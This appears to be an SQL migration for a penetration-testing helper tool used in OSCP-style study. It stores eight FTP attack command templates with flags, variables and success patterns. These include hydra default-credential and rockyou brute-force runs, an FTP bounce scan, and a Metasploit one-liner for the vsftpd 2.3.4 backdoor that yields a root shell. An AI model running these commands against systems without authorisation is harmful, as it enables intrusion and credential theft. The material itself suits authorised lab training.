-- Migration 003: FTP Plugin Command Definitions
-- Populates commands and task templates for FTP service plugin
--
-- Date: 2025-10-28
-- Plugin: ftp (21/tcp)
-- Commands extracted: 8 core FTP enumeration commands
--
-- Note: This is a simplified manual migration for pilot demonstration.
-- Full AST-based extraction script available in scripts/migrate_plugin_to_sql.py

BEGIN TRANSACTION;

-- =============================================================================
-- FTP Plugin Commands (8 commands)
-- =============================================================================

-- Command 1: FTP Banner Grabbing
INSERT INTO commands (
        id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
    ) VALUES (
        'ftp-banner-grab',
    'FTP Banner Grabbing',
    'nc -vn <TARGET> <PORT>',
    'Grab FTP banner to identify service version and check if FTP is running',
    'recon',
    'ftp',
    'high',
    'FTP banners often leak useful version info. Time: ~10 seconds. Flags: -v (verbose), -n (no DNS)'
    )
    ON CONFLICT (id) DO UPDATE SET
        name = EXCLUDED.name,
        command_template = EXCLUDED.command_template,
        description = EXCLUDED.description,
        category = EXCLUDED.category,
        subcategory = EXCLUDED.subcategory,
        oscp_relevance = EXCLUDED.oscp_relevance,
        notes = EXCLUDED.notes;

INSERT INTO tags (name) VALUES ('OSCP:HIGH'), ('QUICK_WIN'), ('MANUAL') ON CONFLICT DO NOTHING;
INSERT INTO command_tags (command_id, tag_id) VALUES ('ftp-banner-grab', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('ftp-banner-grab', (SELECT id FROM tags WHERE name = 'QUICK_WIN')),
    ('ftp-banner-grab', (SELECT id FROM tags WHERE name = 'MANUAL')) ON CONFLICT DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation) VALUES
    ('ftp-banner-grab', '-v', 'Verbose output (show connection details)'),
    ('ftp-banner-grab', '-n', 'No DNS resolution (faster, direct IP connection)');

INSERT INTO command_variables (command_id, name, description, is_required, example_value) VALUES
    ('ftp-banner-grab', '<TARGET>', 'Target IP or hostname', 1, '192.168.1.100'),
    ('ftp-banner-grab', '<PORT>', 'FTP port (standard is 21)', 1, '21');

INSERT INTO command_success_indicators (command_id, pattern, description) VALUES
    ('ftp-banner-grab', '220', 'FTP banner displayed (220 code)'),
    ('ftp-banner-grab', 'FTP', 'FTP service identified');

INSERT INTO command_failure_indicators (command_id, pattern, description) VALUES
    ('ftp-banner-grab', 'Connection refused', 'Port closed or firewall blocking'),
    ('ftp-banner-grab', 'timeout', 'Host unreachable or no response');

-- Command 2: Anonymous FTP Access Test
INSERT INTO commands (
        id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
    ) VALUES (
        'ftp-anon-test',
    'FTP Anonymous Access Test',
    'nmap --script ftp-anon -p<PORT> <TARGET>',
    'Test for anonymous FTP login (username: anonymous, password: anonymous or blank)',
    'recon',
    'ftp',
    'high',
    'Anonymous FTP still common in legacy systems. Often a QUICK WIN. Time: ~30 seconds.'
    )
    ON CONFLICT (id) DO UPDATE SET
        name = EXCLUDED.name,
        command_template = EXCLUDED.command_template,
        description = EXCLUDED.description,
        category = EXCLUDED.category,
        subcategory = EXCLUDED.subcategory,
        oscp_relevance = EXCLUDED.oscp_relevance,
        notes = EXCLUDED.notes;

INSERT INTO command_tags (command_id, tag_id) VALUES ('ftp-anon-test', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('ftp-anon-test', (SELECT id FROM tags WHERE name = 'QUICK_WIN')) ON CONFLICT DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation) VALUES
    ('ftp-anon-test', '--script ftp-anon', 'NSE script to test anonymous FTP access and list directory contents'),
    ('ftp-anon-test', '-p', 'Target port');

INSERT INTO command_variables (command_id, name, description, is_required, example_value) VALUES
    ('ftp-anon-test', '<TARGET>', 'Target IP or hostname', 1, '192.168.1.100'),
    ('ftp-anon-test', '<PORT>', 'FTP port', 1, '21');

INSERT INTO command_success_indicators (command_id, pattern, description) VALUES
    ('ftp-anon-test', 'Anonymous FTP login allowed', 'Anonymous access successful'),
    ('ftp-anon-test', '230 Login successful', 'Login OK response code');

INSERT INTO command_failure_indicators (command_id, pattern, description) VALUES
    ('ftp-anon-test', '530 Login incorrect', 'Anonymous access denied'),
    ('ftp-anon-test', '530 Anonymous access denied', 'Explicit denial');

-- Command 3: FTP NSE Scripts Scan
INSERT INTO commands (
        id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
    ) VALUES (
        'ftp-nmap-scripts',
    'FTP Nmap NSE Scripts',
    'nmap --script ftp-* -p<PORT> <TARGET>',
    'Run all FTP NSE scripts (anonymous login, bounce attack, brute-force, backdoor detection)',
    'recon',
    'ftp',
    'high',
    'Comprehensive but noisy. Includes ftp-anon, ftp-bounce, ftp-brute, ftp-proftpd-backdoor, ftp-vsftpd-backdoor. Time: 2-5 minutes.'
    )
    ON CONFLICT (id) DO UPDATE SET
        name = EXCLUDED.name,
        command_template = EXCLUDED.command_template,
        description = EXCLUDED.description,
        category = EXCLUDED.category,
        subcategory = EXCLUDED.subcategory,
        oscp_relevance = EXCLUDED.oscp_relevance,
        notes = EXCLUDED.notes;

INSERT INTO command_tags (command_id, tag_id) VALUES ('ftp-nmap-scripts', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')) ON CONFLICT DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation) VALUES
    ('ftp-nmap-scripts', '--script ftp-*', 'Run all NSE scripts matching "ftp-*" pattern'),
    ('ftp-nmap-scripts', '-p', 'Target port');

INSERT INTO command_variables (command_id, name, description, is_required, example_value) VALUES
    ('ftp-nmap-scripts', '<TARGET>', 'Target IP or hostname', 1, '192.168.1.100'),
    ('ftp-nmap-scripts', '<PORT>', 'FTP port', 1, '21');

-- Command 4: FTP Recursive Download
INSERT INTO commands (
        id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
    ) VALUES (
        'ftp-wget-mirror',
    'FTP Recursive Download',
    'wget -m ftp://anonymous:anonymous@<TARGET>',
    'Download ALL files recursively from FTP server (mirror mode)',
    'recon',
    'ftp',
    'high',
    'Requires anonymous or valid credentials. Time: 1-30 minutes depending on size. Use --no-passive if PASV fails.'
    )
    ON CONFLICT (id) DO UPDATE SET
        name = EXCLUDED.name,
        command_template = EXCLUDED.command_template,
        description = EXCLUDED.description,
        category = EXCLUDED.category,
        subcategory = EXCLUDED.subcategory,
        oscp_relevance = EXCLUDED.oscp_relevance,
        notes = EXCLUDED.notes;

INSERT INTO command_tags (command_id, tag_id) VALUES ('ftp-wget-mirror', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')) ON CONFLICT DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation) VALUES
    ('ftp-wget-mirror', '-m', 'Mirror mode (recursive download with infinite depth, timestamps)');

INSERT INTO command_variables (command_id, name, description, is_required, example_value) VALUES
    ('ftp-wget-mirror', '<TARGET>', 'Target IP or hostname', 1, '192.168.1.100');

INSERT INTO command_success_indicators (command_id, pattern, description) VALUES
    ('ftp-wget-mirror', 'Downloaded:', 'Files successfully downloaded'),
    ('ftp-wget-mirror', 'saved', 'Files saved to disk');

INSERT INTO command_failure_indicators (command_id, pattern, description) VALUES
    ('ftp-wget-mirror', 'Authentication failed', 'Invalid credentials'),
    ('ftp-wget-mirror', 'Passive mode', 'PASV mode error - use --no-passive');

-- Command 5: FTP Default Credentials Test
INSERT INTO commands (
        id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
    ) VALUES (
        'ftp-hydra-defaults',
    'FTP Default Credentials Test',
    'hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <TARGET> ftp',
    'Test common default FTP credentials (admin:admin, root:root, ftp:ftp) - QUICK WIN before full brute-force',
    'exploitation',
    'ftp',
    'high',
    'SecLists has 64 FTP default creds. Try this BEFORE full brute-force. Time: 1-2 minutes.'
    )
    ON CONFLICT (id) DO UPDATE SET
        name = EXCLUDED.name,
        command_template = EXCLUDED.command_template,
        description = EXCLUDED.description,
        category = EXCLUDED.category,
        subcategory = EXCLUDED.subcategory,
        oscp_relevance = EXCLUDED.oscp_relevance,
        notes = EXCLUDED.notes;

INSERT INTO command_tags (command_id, tag_id) VALUES ('ftp-hydra-defaults', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('ftp-hydra-defaults', (SELECT id FROM tags WHERE name = 'QUICK_WIN')) ON CONFLICT DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation) VALUES
    ('ftp-hydra-defaults', '-C', 'Colon-separated username:password list (format: user:pass per line)');

INSERT INTO command_variables (command_id, name, description, is_required, example_value) VALUES
    ('ftp-hydra-defaults', '<TARGET>', 'Target IP or hostname', 1, '192.168.1.100');

INSERT INTO command_success_indicators (command_id, pattern, description) VALUES
    ('ftp-hydra-defaults', '[21][ftp]', 'Valid credentials found'),
    ('ftp-hydra-defaults', 'login:', 'Successful authentication');

INSERT INTO command_failure_indicators (command_id, pattern, description) VALUES
    ('ftp-hydra-defaults', 'All attempts failed', 'No default credentials work');

-- Command 6: FTP Brute Force
INSERT INTO commands (
        id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
    ) VALUES (
        'ftp-hydra-brute',
    'FTP Credential Brute Force',
    'hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -t 4 ftp://<TARGET>',
    'Full credential brute-force with wordlists (SLOW, NOISY - use only if other methods fail)',
    'exploitation',
    'ftp',
    'low',
    'FTP brute-force is SLOW. Use small wordlists for OSCP. Time: 30+ minutes. Can trigger lockout.'
    )
    ON CONFLICT (id) DO UPDATE SET
        name = EXCLUDED.name,
        command_template = EXCLUDED.command_template,
        description = EXCLUDED.description,
        category = EXCLUDED.category,
        subcategory = EXCLUDED.subcategory,
        oscp_relevance = EXCLUDED.oscp_relevance,
        notes = EXCLUDED.notes;

INSERT INTO command_tags (command_id, tag_id) VALUES ('ftp-hydra-brute', (SELECT id FROM tags WHERE name = 'OSCP:LOW')) ON CONFLICT DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation) VALUES
    ('ftp-hydra-brute', '-L', 'Username wordlist (file with one username per line)'),
    ('ftp-hydra-brute', '-P', 'Password wordlist (rockyou.txt = 14 million passwords)'),
    ('ftp-hydra-brute', '-t', 'Parallel tasks/threads (4 = safe/slow, 16 = aggressive)');

INSERT INTO command_variables (command_id, name, description, is_required, example_value) VALUES
    ('ftp-hydra-brute', '<TARGET>', 'Target IP or hostname', 1, '192.168.1.100');

-- Command 7: FTP Bounce Attack Detection
INSERT INTO commands (
        id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
    ) VALUES (
        'ftp-bounce-scan',
    'FTP Bounce Attack Detection',
    'nmap -Pn -v -p 21,80 -b anonymous:anonymous@<TARGET> 127.0.0.1',
    'Test if FTP server allows PORT command (bounce attack) to scan other hosts/ports',
    'exploitation',
    'ftp',
    'medium',
    'FTP bounce attacks are RARE on modern servers. Allows scanning internal networks. Time: 2-5 minutes.'
    )
    ON CONFLICT (id) DO UPDATE SET
        name = EXCLUDED.name,
        command_template = EXCLUDED.command_template,
        description = EXCLUDED.description,
        category = EXCLUDED.category,
        subcategory = EXCLUDED.subcategory,
        oscp_relevance = EXCLUDED.oscp_relevance,
        notes = EXCLUDED.notes;

INSERT INTO command_tags (command_id, tag_id) VALUES ('ftp-bounce-scan', (SELECT id FROM tags WHERE name = 'OSCP:MEDIUM')) ON CONFLICT DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation) VALUES
    ('ftp-bounce-scan', '-Pn', 'No ping (treat host as online)'),
    ('ftp-bounce-scan', '-v', 'Verbose output'),
    ('ftp-bounce-scan', '-b', 'Bounce scan through FTP server (proxy)');

INSERT INTO command_variables (command_id, name, description, is_required, example_value) VALUES
    ('ftp-bounce-scan', '<TARGET>', 'FTP server IP (proxy)', 1, '192.168.1.100');

-- Command 8: vsftpd 2.3.4 Backdoor Exploit
INSERT INTO commands (
        id, name, command_template, description, category, subcategory,
    oscp_relevance, notes
    ) VALUES (
        'vsftpd-backdoor-msf',
    'vsftpd 2.3.4 Backdoor Exploit',
    'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST <TARGET>; set RPORT <PORT>; exploit"',
    'Exploit vsftpd 2.3.4 backdoor (smiley face backdoor) - INSTANT ROOT SHELL',
    'exploitation',
    'ftp',
    'high',
    'Backdoor intentionally inserted in vsftpd 2.3.4 (2011). Login with ":)" triggers backdoor on port 6200. Famous in OSCP labs. Time: 30 seconds - 1 minute.'
    )
    ON CONFLICT (id) DO UPDATE SET
        name = EXCLUDED.name,
        command_template = EXCLUDED.command_template,
        description = EXCLUDED.description,
        category = EXCLUDED.category,
        subcategory = EXCLUDED.subcategory,
        oscp_relevance = EXCLUDED.oscp_relevance,
        notes = EXCLUDED.notes;

INSERT INTO command_tags (command_id, tag_id) VALUES ('vsftpd-backdoor-msf', (SELECT id FROM tags WHERE name = 'OSCP:HIGH')),
    ('vsftpd-backdoor-msf', (SELECT id FROM tags WHERE name = 'QUICK_WIN')) ON CONFLICT DO NOTHING;

INSERT INTO command_flags (command_id, flag, explanation) VALUES
    ('vsftpd-backdoor-msf', '-q', 'Quiet mode (suppress banner)'),
    ('vsftpd-backdoor-msf', '-x', 'Execute commands after startup');

INSERT INTO command_variables (command_id, name, description, is_required, example_value) VALUES
    ('vsftpd-backdoor-msf', '<TARGET>', 'Target IP', 1, '192.168.1.100'),
    ('vsftpd-backdoor-msf', '<PORT>', 'FTP port', 1, '21');

INSERT INTO command_success_indicators (command_id, pattern, description) VALUES
    ('vsftpd-backdoor-msf', 'Command shell session opened', 'Exploit successful - shell obtained'),
    ('vsftpd-backdoor-msf', 'uid=0', 'Root shell obtained');

INSERT INTO command_failure_indicators (command_id, pattern, description) VALUES
    ('vsftpd-backdoor-msf', 'Exploit failed', 'Backdoor not present'),
    ('vsftpd-backdoor-msf', 'Connection refused on port 6200', 'Backdoor port not opening');

-- =============================================================================
-- FTP Plugin Task Templates (8 tasks)
-- =============================================================================

-- Get FTP plugin ID
SET @ftp_plugin_id = (SELECT id FROM service_plugins WHERE name = 'ftp');

-- Task 1: Banner Grabbing
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-banner',
    'Banner Grabbing',
    'command',
    'ftp-banner-grab',
    1,
    'Grab FTP banner to identify service version',
    '["OSCP:HIGH", "QUICK_WIN", "MANUAL"]'
);

INSERT INTO plugin_task_variables (
    task_template_id, variable_name, variable_source, required
) VALUES
    (last_insert_rowid(), '<TARGET>', 'target', 1),
    (last_insert_rowid(), '<PORT>', 'port', 1);

-- Task 2: Anonymous Access Test
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-anon',
    'Anonymous Access Test',
    'command',
    'ftp-anon-test',
    2,
    'Test for anonymous FTP login',
    '["OSCP:HIGH", "QUICK_WIN"]'
);

INSERT INTO plugin_task_variables (
    task_template_id, variable_name, variable_source, required
) VALUES
    (last_insert_rowid(), '<TARGET>', 'target', 1),
    (last_insert_rowid(), '<PORT>', 'port', 1);

-- Task 3: FTP NSE Scripts
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-scripts',
    'Automated FTP Script Scan',
    'command',
    'ftp-nmap-scripts',
    3,
    'Run all FTP NSE scripts',
    '["OSCP:HIGH", "AUTOMATED"]'
);

INSERT INTO plugin_task_variables (
    task_template_id, variable_name, variable_source, required
) VALUES
    (last_insert_rowid(), '<TARGET>', 'target', 1),
    (last_insert_rowid(), '<PORT>', 'port', 1);

-- Task 4: File Download
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-download',
    'Recursive File Download',
    'command',
    'ftp-wget-mirror',
    4,
    'Download all files from FTP server',
    '["OSCP:HIGH", "AUTOMATED"]'
);

INSERT INTO plugin_task_variables (
    task_template_id, variable_name, variable_source, required
) VALUES
    (last_insert_rowid(), '<TARGET>', 'target', 1);

-- Task 5: Default Credentials
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-default-creds',
    'Test Default Credentials',
    'command',
    'ftp-hydra-defaults',
    5,
    'Test common default FTP credentials',
    '["OSCP:HIGH", "QUICK_WIN"]'
);

INSERT INTO plugin_task_variables (
    task_template_id, variable_name, variable_source, required
) VALUES
    (last_insert_rowid(), '<TARGET>', 'target', 1);

-- Task 6: Brute Force (low priority)
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-bruteforce',
    'Full Credential Brute-force',
    'command',
    'ftp-hydra-brute',
    10,  -- Low priority (slow, noisy)
    'Full credential brute-force',
    '["OSCP:LOW", "AUTOMATED", "NOISY"]'
);

INSERT INTO plugin_task_variables (
    task_template_id, variable_name, variable_source, required
) VALUES
    (last_insert_rowid(), '<TARGET>', 'target', 1);

-- Task 7: Bounce Attack
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'ftp-bounce',
    'FTP Bounce Attack Detection',
    'command',
    'ftp-bounce-scan',
    7,
    'Test FTP bounce attack capability',
    '["OSCP:MEDIUM", "ADVANCED"]'
);

INSERT INTO plugin_task_variables (
    task_template_id, variable_name, variable_source, required
) VALUES
    (last_insert_rowid(), '<TARGET>', 'target', 1);

-- Task 8: vsftpd Backdoor (version-specific)
INSERT INTO plugin_task_templates (
    plugin_id, task_id, task_name, task_type, command_id,
    priority, description, tags
) VALUES (
    (SELECT id FROM service_plugins WHERE name = 'ftp'),
    'vsftpd-backdoor',
    'vsftpd 2.3.4 Backdoor Exploit',
    'command',
    'vsftpd-backdoor-msf',
    6,
    'Exploit vsftpd 2.3.4 backdoor',
    '["OSCP:HIGH", "EXPLOIT", "QUICK_WIN"]'
);

INSERT INTO plugin_task_variables (
    task_template_id, variable_name, variable_source, required
) VALUES
    (last_insert_rowid(), '<TARGET>', 'target', 1),
    (last_insert_rowid(), '<PORT>', 'port', 1);

COMMIT;

-- =============================================================================
-- Validation Queries
-- =============================================================================

-- Check FTP commands
-- SELECT COUNT(*) FROM commands WHERE subcategory = 'ftp';
-- Expected: 8

-- Check FTP task templates
-- SELECT COUNT(*) FROM plugin_task_templates
-- WHERE plugin_id = (SELECT id FROM service_plugins WHERE name = 'ftp');
-- Expected: 8

-- View FTP plugin tasks
-- SELECT t.task_id, t.task_name, c.name as command_name
-- FROM plugin_task_templates t
-- LEFT JOIN commands c ON t.command_id = c.id
-- WHERE t.plugin_id = (SELECT id FROM service_plugins WHERE name = 'ftp')
-- ORDER BY t.priority;
